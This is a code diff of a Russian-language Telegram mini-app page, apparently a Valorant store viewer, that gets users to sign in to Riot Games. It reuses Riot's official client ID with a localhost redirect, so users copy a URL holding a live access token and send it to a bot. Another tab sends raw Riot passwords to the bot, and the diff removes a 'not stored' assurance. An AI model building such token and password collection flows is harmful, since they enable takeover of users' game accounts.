@@ -6,56 +6,46 @@
     <title>Valorant Store Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background: var(--tg-theme-bg-color, #1c1c1e); 
-            color: var(--tg-theme-text-color, #fff); 
-            padding: 20px; margin: 0;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--tg-theme-bg-color, #1c1c1e); color: var(--tg-theme-text-color, #fff); padding: 20px; margin: 0; }
         .tabs { display: flex; margin-bottom: 20px; background: var(--tg-theme-secondary-bg-color, #2c2c2e); border-radius: 8px; overflow: hidden; }
-        .tabs button { 
-            flex: 1; padding: 12px; background: transparent; color: var(--tg-theme-text-color, #fff); 
-            border: none; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s;
-        }
+        .tabs button { flex: 1; padding: 12px; background: transparent; color: var(--tg-theme-text-color, #fff); border: none; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; }
         .tabs button.active { background: #ff4655; color: #fff; }
         .tab { display: none; }
         .tab.active { display: block; }
         
-        input { 
-            width: 100%; padding: 12px; margin-bottom: 12px; box-sizing: border-box; 
-            background: var(--tg-theme-secondary-bg-color, #2c2c2e); 
-            color: var(--tg-theme-text-color, #fff); border: 1px solid #444; border-radius: 8px; outline: none;
-        }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; box-sizing: border-box; background: var(--tg-theme-secondary-bg-color, #2c2c2e); color: var(--tg-theme-text-color, #fff); border: 1px solid #444; border-radius: 8px; outline: none; }
         input:focus { border-color: #ff4655; }
-        .btn-main { 
-            width: 100%; padding: 14px; background: #ff4655; color: #fff; border: none; 
-            border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 5px;
-        }
+        .btn-main { width: 100%; padding: 14px; background: #ff4655; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 5px; }
         .btn-secondary { background: var(--tg-theme-button-color, #3390ec); margin-bottom: 15px;}
-        .hint { font-size: 13px; color: var(--tg-theme-hint-color, #aaa); margin-bottom: 15px; line-height: 1.4; }
+        .alert { background: rgba(255, 70, 85, 0.1); border-left: 4px solid #ff4655; padding: 10px; margin-bottom: 15px; border-radius: 4px; font-size: 14px; line-height: 1.5;}
     </style>
 </head>
 <body>
-    <h2 style="text-align: center; color: #ff4655; margin-top: 0;">Valorant Store</h2>
+    <h2 style="text-align: center; color: #ff4655; margin-top: 0;">Магазин Valorant</h2>
 
     <div class="tabs">
-        <button class="active" onclick="switchTab('tab-token')">По ссылке (100%)</button>
+        <button class="active" onclick="switchTab('tab-token')">По Ссылке (100%)</button>
         <button onclick="switchTab('tab-cred')">Логин / Пароль</button>
     </div>
 
     <div id="tab-token" class="tab active">
-        <div class="hint">Самый надежный метод. Обходит капчи и 2FA авторизацию.<br><br><b>1.</b> Нажми кнопку ниже (откроется сайт Riot).<br><b>2.</b> Войди в аккаунт.<br><b>3.</b> Страница станет белой. Скопируй её длинную ссылку и вставь сюда.</div>
+        <div class="alert">
+            <b>КАК ВОЙТИ:</b><br><br>
+            1. Нажми кнопку "Войти в Riot Games".<br>
+            2. Войди в аккаунт. Страница зависнет и выдаст ошибку браузера <b>"Сайт недоступен (localhost)"</b>. Это НОРМАЛЬНО, так и должно быть!<br>
+            3. Кликни по <b>АДРЕСНОЙ СТРОКЕ</b> сверху и <b>скопируй всю длинную ссылку целиком</b> (Она не должна начинаться с <code style="color: gray;">&lt;!DOCTYPE html&gt;</code>).<br>
+            4. Вставь её ниже, либо <b>просто отправь её сообщением боту в чат!</b>
+        </div>
         <button class="btn-main btn-secondary" onclick="openAuth()">Войти в Riot Games</button>
-        <input type="text" id="url_input" placeholder="Вставь ссылку (https://playvalorant.com/opt_in#...)">
+        <input type="text" id="url_input" placeholder="Вставь ссылку (http://localhost/redirect#...)">
         <button class="btn-main" onclick="sendToken()">Показать магазин</button>
     </div>
 
     <div id="tab-cred" class="tab">
-        <div class="hint">⚠️ Может не сработать, если на аккаунте Riot включена двухфакторка (2FA) или сработает капча. В таком случае используй вкладку "По ссылке".</div>
+        <div class="alert" style="border-left-color: gray;">⚠️ Этот метод не сработает, если у тебя включена двухфакторная аутентификация (2FA) или Riot покажет скрытую капчу.</div>
         <input type="text" id="username" placeholder="Riot ID (Логин)">
         <input type="password" id="password" placeholder="Пароль">
         <button class="btn-main" onclick="sendCreds()">Войти</button>
-        <div class="hint" style="text-align: center; margin-top: 15px;">Пароль отправляется напрямую боту и нигде не сохраняется.</div>
     </div>
 
     <script>
@@ -70,15 +60,15 @@
         }
 
         function openAuth() {
-            // Открывает поверх TMA официальную страницу входа Riot
-            tg.openLink("https://auth.riotgames.com/authorize?redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in&client_id=play-valorant-web-prod&response_type=token%20id_token&nonce=1");
+            // ИСПОЛЬЗУЕМ LOCALHOST ДЛЯ ИЗБЕЖАНИЯ 404 РЕДИРЕКТА. 
+            // Браузер выдаст ошибку "Сервер не найден", и ссылка останется нетронутой!
+            tg.openLink("https://auth.riotgames.com/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=play-valorant-web-prod&response_type=token%20id_token&nonce=1&scope=account%20openid");
         }
 
         function sendToken() {
             const url = document.getElementById('url_input').value.trim();
-            if (!url.includes("access_token=")) return tg.showAlert("❌ Неверная ссылка! Убедись, что скопировал целиком.");
+            if (!url.includes("access_token=")) return tg.showAlert("❌ В ссылке нет токена! Убедись, что скопировал её из адресной строки (сверху) на странице с ошибкой 'Сайт недоступен'.");
             
-            // Отправляем JSON боту в Python
             tg.sendData(JSON.stringify({type: "token", url: url}));
             tg.close();
         }
